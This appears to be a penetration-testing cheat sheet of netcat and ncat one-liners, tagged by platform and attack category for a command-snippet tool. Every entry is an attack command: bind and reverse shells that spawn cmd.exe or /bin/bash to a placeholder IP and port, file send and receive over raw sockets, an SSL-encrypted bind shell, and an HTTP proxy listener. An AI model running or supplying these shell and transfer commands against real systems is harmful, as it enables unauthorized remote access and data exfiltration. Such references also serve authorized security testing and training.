# netcat

% nc, netcat

#plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 
## Netcat - Setup Listener
Sets up a Netcat listener for incoming connections.
```
nc -lvnp <lport>
```

## Netcat - Windows Bind Shell
Creates a bind shell on a Windows target, listening for incoming connections.
#plateform/windows 
```
nc -lvnp <port> -e cmd.exe
```

## Netcat - Linux Bind Shell
Creates a bind shell on a Linux target, listening for incoming connections.
#plateform/linux
```
nc -lvnp <port> -e /bin/bash
```

## Netcat - Windows Reverse Shell
Connects back to a listener on the attacking machine from a Windows target.
#plateform/windows  #cat/ATTACK/REVERSE_SHELL 
```
nc -nv <ip> <port> -e cmd.exe
```

## Netcat - Linux Reverse Shell
Connects back to a listener on the attacking machine from a Linux target.
#plateform/linux #cat/ATTACK/REVERSE_SHELL 
```
nc -nv <ip> <port> -e /bin/bash
```

## Netcat - File Transfer (Receiver)
Sets up Netcat to receive a file.
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -lvnp <port> > <incoming_file>
```

## Netcat - File Transfer (Sender)
Sends a file using Netcat.
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nv <ip> <port> < <file_to_send>
```

# ncat

% ncat

## Ncat - Bind Shell with SSL and IP Filter
Creates an Ncat bind shell with SSL encryption, allowing connections only from a specified IP.
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
```

## Ncat - Connect to SSL Bind Shell
Connects to an Ncat bind shell that is using SSL.
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat -v <ip> <port> --ssl
```

## Ncat - HTTP Web Proxy
Sets up Ncat to act as a simple HTTP web proxy.
#plateform/linux #cat/ATTACK/LISTEN-SERVE 
```
ncat --listen --proxy-type http <port>
```

